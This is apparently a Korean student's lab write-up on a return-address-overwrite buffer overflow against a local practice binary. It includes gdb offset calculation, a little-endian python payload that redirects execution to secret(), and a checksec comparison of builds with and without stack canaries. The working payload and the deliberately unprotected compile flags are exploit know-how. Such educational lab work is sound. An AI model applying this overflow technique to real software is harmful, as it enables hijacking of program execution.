# Week09 Challenge

---

## Challenge1. ret address 덮어서 실행 흐름 바꾸기

### 핵심 개념

버퍼 오버플로우는 정해진 크기의 버퍼보다 더 많은 데이터를 입력하여,
버퍼 뒤에 위치한 다른 메모리 영역까지 덮어쓰는 취약점이다.

함수가 호출되면 스택에는 지역 변수, 이전 `rbp`, return address 등이 저장된다.
return address는 함수 실행이 끝난 뒤 어디로 돌아갈지를 나타내는 주소이다.

따라서 버퍼 오버플로우를 이용해 return address를 다른 함수의 주소로 덮으면,
함수가 종료될 때 원래 위치로 돌아가지 않고 공격자가 지정한 함수로 실행 흐름이 이동할 수 있다.

이번 실습에서는 `vuln()` 함수의 return address를 `secret()` 함수 주소로 덮어,
원래 호출되지 않아야 하는 `secret()` 함수가 실행되도록 하였다.

---

### offset 계산

`gdb`에서 `print &buf` 명령어를 사용하여 버퍼의 시작 주소를 확인하였다.

```text
buf 시작 주소 = 0x7fffffffd7d0
```

또한 `info frame` 명령어를 사용하여 saved rip 위치를 확인하였다.

```text
saved rip 위치 = 0x7fffffffd7e8
```

offset은 버퍼 시작 주소부터 saved return address까지의 거리이다.

```text
0x7fffffffd7e8 - 0x7fffffffd7d0 = 0x18
```

`0x18`은 10진수로 24이므로, 이번 실습에서 offset은 24바이트이다.

```text
offset = 24
```

즉, 24바이트만큼 임의의 값을 채운 뒤 그 다음에 `secret()` 함수 주소를 넣으면 return address를 덮을 수 있다.

---

### secret 함수 주소 확인

`gdb`에서 `p secret` 명령어를 사용하여 `secret()` 함수의 주소를 확인하였다.

```text
secret() 주소 = 0x401156
```

이 주소를 payload에 넣어 return address가 `secret()` 함수를 가리키도록 하였다.

---

### little endian

little endian은 메모리에 값을 저장할 때 낮은 바이트부터 먼저 저장하는 방식이다.
x86-64 환경에서는 주소를 메모리에 넣을 때 little endian 형식으로 넣어야 한다.

`secret()` 함수 주소는 다음과 같다.

```text
0x401156
```

이를 8바이트 주소로 표현하면 다음과 같다.

```text
0x0000000000401156
```

little endian 형식으로 payload에 넣으면 바이트 순서는 다음과 같다.

```text
\x56\x11\x40\x00\x00\x00\x00\x00
```

따라서 주소를 사람이 읽는 순서 그대로 넣는 것이 아니라, 낮은 바이트부터 뒤집어서 넣어야 한다.

---

### 실행 결과 및 정리

offset 24바이트만큼 `A`를 채운 뒤, `secret()` 함수 주소를 little endian 형식으로 이어 붙여 payload를 구성하였다.

```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*24 + b"\x56\x11\x40\x00\x00\x00\x00\x00")' | ./vuln
```

실행 결과 다음과 같이 출력되었다.

```text
secret function called!
Segmentation fault (core dumped)
```

`secret function called!`가 출력되었으므로, return address가 `secret()` 함수 주소로 덮였고 실행 흐름이 `secret()` 함수로 이동했음을 확인할 수 있다.

---

## Challenge2. checksec으로 보호 기법 확인

### 실습 내용

Challenge1에서 만든 바이너리에 `checksec`을 실행하여 적용된 보호 기법을 확인하였다.
또한 Stack Canary 옵션 유무에 따라 checksec 결과가 어떻게 달라지는지 비교하였다.

비교한 바이너리는 다음과 같다.

```text
vuln        : -fno-stack-protector 옵션으로 컴파일
vuln_canary : -fstack-protector 옵션으로 컴파일
```

---

### 핵심 개념

`checksec`은 ELF 바이너리에 적용된 보안 보호 기법을 확인하는 도구이다.
버퍼 오버플로우와 같은 취약점 실습에서 현재 바이너리가 어떤 보호 기법을 가지고 있는지 확인할 때 사용한다.

`checksec`으로 확인할 수 있는 주요 정보는 다음과 같다.

* RELRO
  GOT 영역 보호 여부를 확인한다.

* Stack Canary
  스택 버퍼 오버플로우를 탐지하기 위한 보호 값이 있는지 확인한다.

* NX
  스택이나 Heap 영역에서 코드 실행을 막는 보호 기법이 적용되어 있는지 확인한다.

* PIE
  프로그램 코드 영역의 주소가 실행할 때마다 랜덤화될 수 있는지 확인한다.

* Fortify
  위험한 함수 사용에 대한 컴파일 단계의 보호 기능이 적용되었는지 확인한다.

---

### 실행 결과 및 정리

먼저 Challenge1에서 사용한 `vuln` 바이너리에 checksec을 실행하였다.

```bash
checksec --file=./vuln
```

실행 결과는 다음과 같았다.

```text
RELRO           Partial RELRO
STACK CANARY    No canary found
NX              NX enabled
PIE             No PIE
```

`vuln`은 `-fno-stack-protector` 옵션으로 컴파일했기 때문에 Stack Canary가 적용되지 않았다.
또한 `-no-pie` 옵션으로 컴파일했기 때문에 PIE가 비활성화되어 있었다.

다음으로 Stack Canary를 적용한 `vuln_canary` 바이너리를 생성하였다.

```bash
gcc -g -O0 -fstack-protector -no-pie -o vuln_canary challenge1.c
```

그리고 checksec을 실행하였다.

```bash
checksec --file=./vuln_canary
```

실행 결과는 다음과 같았다.

```text
RELRO           Partial RELRO
STACK CANARY    Canary found
NX              NX enabled
PIE             No PIE
```

`vuln_canary`는 `-fstack-protector` 옵션으로 컴파일했기 때문에 Stack Canary가 적용되었다.

두 결과를 비교하면 다음과 같다.

```text
vuln
- Stack Canary: No canary found
- PIE: No PIE

vuln_canary
- Stack Canary: Canary found
- PIE: No PIE
```

즉, `-fno-stack-protector` 옵션을 사용하면 Canary가 비활성화되고,
`-fstack-protector` 옵션을 사용하면 Canary가 적용되는 것을 확인하였다.

Stack Canary가 없으면 버퍼 오버플로우로 return address를 덮어도 이를 탐지하지 못한다.
반면 Stack Canary가 있으면 함수가 반환되기 전에 스택 변조 여부를 확인할 수 있어, return address overwrite 공격을 어렵게 만든다.

---
